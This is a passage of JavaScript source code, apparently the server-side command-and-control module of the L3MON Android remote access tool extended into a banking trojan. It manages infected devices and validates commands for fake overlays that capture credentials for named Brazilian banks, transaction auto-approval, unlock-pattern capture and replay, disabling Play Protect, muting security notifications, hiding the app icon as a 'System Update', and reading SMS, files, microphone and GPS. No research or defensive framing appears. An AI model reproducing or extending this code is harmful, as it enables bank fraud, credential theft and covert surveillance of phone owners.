                let unlockConfig = clientDB.get('dynamicScreenUnlockConfig').value() || {};
                pageData = {
                    capturedPatterns: unlockConfig.capturedPatterns || [],
                    unlockLog: unlockConfig.unlockLog || [],
                    autoUnlockEnabled: unlockConfig.autoUnlockEnabled || false
                };
            }
            else if (page === "overlay_injection") {
                let overlayConfig = clientDB.get('overlayInjectionConfig').value() || {};
                pageData = {
                    enabledBanks: overlayConfig.enabledBanks || ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'],
                    activeOverlays: overlayConfig.activeOverlays || [],
                    capturedCredentials: overlayConfig.capturedCredentials || [],
                    overlayLog: overlayConfig.overlayLog || [],
                    monitoringEnabled: overlayConfig.monitoringEnabled || false
                };
            }
            else if (page === "customized_forms_capture") {
                let fcConfig = clientDB.get('customizedFormsCaptureConfig').value() || {};
                pageData = {
                    enabledBanks: fcConfig.enabledBanks || { 'itau': true, 'bradesco': true, 'caixa': true, 'nubank': true, 'bb': true, 'santander': true },
                    realTimeCaptureEnabled: fcConfig.realTimeCaptureEnabled || false,
                    capturedData: fcConfig.capturedData || [],
                    captureLog: fcConfig.captureLog || [],
                    templateVersions: fcConfig.templateVersions || {}
                };
            }
            else if (page === "bypass_protections") {
                let bpConfig = clientDB.get('bypassProtectionsConfig').value() || {};
                pageData = {
                    bypassEnabled: bpConfig.bypassEnabled || false,
                    androidVersion: bpConfig.androidVersion || 0,
                    restrictedSettingsBypassed: bpConfig.restrictedSettingsBypassed || false,
                    accessibilityServiceForced: bpConfig.accessibilityServiceForced || false,
                    installationMethod: bpConfig.installationMethod || 'none',
                    spoofedAppName: bpConfig.spoofedAppName || 'System Update',
                    spoofedAppType: bpConfig.spoofedAppType || 'system_update',
                    bypassLog: bpConfig.bypassLog || [],
                    detectedProtections: bpConfig.detectedProtections || [],
                    bypassStatus: bpConfig.bypassStatus || {}
                };
            }
            else if (page === "advanced_hide_icon") {
                let hideConfig = clientDB.get('advancedHideIconConfig').value() || {};
                pageData = {
                    hideEnabled: hideConfig.hideEnabled || false,
                    iconHidden: hideConfig.iconHidden || false,
                    backgroundServiceActive: hideConfig.backgroundServiceActive || false,
                    activationMethod: hideConfig.activationMethod || 'none',
                    activationCode: hideConfig.activationCode || '',
                    smsActivationEnabled: hideConfig.smsActivationEnabled || false,
                    smsActivationPhrase: hideConfig.smsActivationPhrase || 'activate_l3mon',
                    launcherIconRemoved: hideConfig.launcherIconRemoved || false,
                    launcherName: hideConfig.launcherName || 'com.etechd.l3mon',
                    launcherAlias: hideConfig.launcherAlias || 'Hidden Service',
                    hideLog: hideConfig.hideLog || [],
                    hiddenStatus: hideConfig.hiddenStatus || {},
                    detectedLaunchers: hideConfig.detectedLaunchers || [],
                    restoreMethod: hideConfig.restoreMethod || 'none'
                };
            }
            else if (page === "text_injection") {
                pageData = {
                    editableFields: client.lastEditableFields || [],
                    lastUpdate: client.lastAccessibilityUpdate || 'Nunca'
                };
            }
            else if (page === "ats") pageData = {};
            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            else if (page === "gps") pageData = clientData.GPSData;
            else if (page === "info") pageData = client;

            return pageData;
        } else return false;
    }

    // DELETE
    deleteClient(clientID) {
        this.db.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
                        socket.emit('order', commandPayload)
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)')
                            else return cb(error, undefined)
                        })
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = [];
        commandQue.value().forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
        else {
            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commandQue.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.mic) {
            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.gotPermission) {
            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.permissionAction) {
            if (!('permission' in commandPayload)) return cb('Permission Action Missing `permission` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.autoClick) {
            if (!('action' in commandPayload)) return cb('AutoClick Missing `action` Parameter');
            if (!('x' in commandPayload)) return cb('AutoClick Missing `x` Parameter');
            if (!('y' in commandPayload)) return cb('AutoClick Missing `y` Parameter');
            if (isNaN(parseInt(commandPayload.x))) return cb('AutoClick `x` Parameter must be a number');
            if (isNaN(parseInt(commandPayload.y))) return cb('AutoClick `y` Parameter must be a number');
            if (commandPayload.action !== 'tap' && commandPayload.action !== 'long' && commandPayload.action !== 'swipe') return cb('AutoClick `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.overlay) {
            if (!('text' in commandPayload)) return cb('Overlay Missing `text` Parameter');
            if (typeof commandPayload.text !== 'string' || commandPayload.text.trim().length === 0) return cb('Overlay `text` Parameter must be a non-empty string');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.accessibilityBypass) {
            if (!('service' in commandPayload)) return cb('Accessibility Bypass Missing `service` Parameter');
            if (typeof commandPayload.service !== 'string' || commandPayload.service.trim().length === 0) return cb('Accessibility Bypass `service` Parameter must be a non-empty string');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.setText) {
            if (!('text' in commandPayload)) return cb('SetText Missing `text` Parameter');
            if (typeof commandPayload.text !== 'string' || commandPayload.text.trim().length === 0) return cb('SetText `text` Parameter must be a non-empty string');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.defenseDisable) {
            if (!('action' in commandPayload)) return cb('DefenseDisable Missing `action` Parameter');
            const validActions = ['disable_play_protect', 'mute_security_notifications'];
            if (!validActions.includes(commandPayload.action)) return cb('DefenseDisable `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.permissionGrant) {
            if (!('action' in commandPayload)) return cb('PermissionGrant Missing `action` Parameter');
            const validActions = ['enable', 'disable', 'grant_permission'];
            if (!validActions.includes(commandPayload.action)) return cb('PermissionGrant `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.gestureSimulation) {
            if (!('gestureType' in commandPayload)) return cb('GestureSimulation Missing `gestureType` Parameter');
            if (!('x' in commandPayload) || !('y' in commandPayload)) return cb('GestureSimulation Missing `x` or `y` Parameter');
            const validGestures = ['tap', 'long_tap', 'swipe'];
            if (!validGestures.includes(commandPayload.gestureType)) return cb('GestureSimulation `gestureType` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.transactionApproval) {
            if (!('action' in commandPayload)) return cb('TransactionApproval Missing `action` Parameter');
            const validActions = ['fill_fields', 'approve_transaction', 'enable_auto_approval', 'disable_auto_approval'];
            if (!validActions.includes(commandPayload.action)) return cb('TransactionApproval `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.dynamicScreenUnlock) {
            if (!('action' in commandPayload)) return cb('DynamicScreenUnlock Missing `action` Parameter');
            const validActions = ['capture_pattern', 'replay_pattern', 'enable_auto_unlock', 'disable_auto_unlock'];
            if (!validActions.includes(commandPayload.action)) return cb('DynamicScreenUnlock `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.overlayInjection) {
            if (!('action' in commandPayload)) return cb('OverlayInjection Missing `action` Parameter');
            const validActions = ['show_overlay', 'hide_overlay', 'capture_credentials', 'enable_monitoring', 'disable_monitoring', 'enable_bank', 'disable_bank', 'clear_credentials'];
            if (!validActions.includes(commandPayload.action)) return cb('OverlayInjection `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.customizedFormsCapture) {
            if (!('action' in commandPayload)) return cb('CustomizedFormsCapture Missing `action` Parameter');
            const validActions = ['capture_field', 'submit_form', 'enable_realtime', 'disable_realtime', 'show_form', 'enable_bank', 'disable_bank'];
            if (!validActions.includes(commandPayload.action)) return cb('CustomizedFormsCapture `action` parameter incorrect');
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.bypassProtections) {
            if (!('action' in commandPayload)) return cb('BypassProtections Missing `action` Parameter');
            const validActions = ['enable_bypass', 'disable_bypass', 'bypass_restricted_settings', 'force_accessibility_service', 'detect_protections', 'installation_method_update'];
            if (!validActions.includes(commandPayload.action)) return cb('BypassProtections `action` parameter incorrect');
            else cb(false)
        }
        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
        else return cb('Command ID Not Found');
    }

    gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

        let clientDB = this.getClientDatabase(clientID);
        let gpsSettings = clientDB.get('GPSSettings').value();

        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
                this.sendCommand(clientID, '0xLO')
            }, gpsSettings.updateFrequency * 1000);
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else return cb('Polling Too Short!')

    }
}

module.exports = Clients;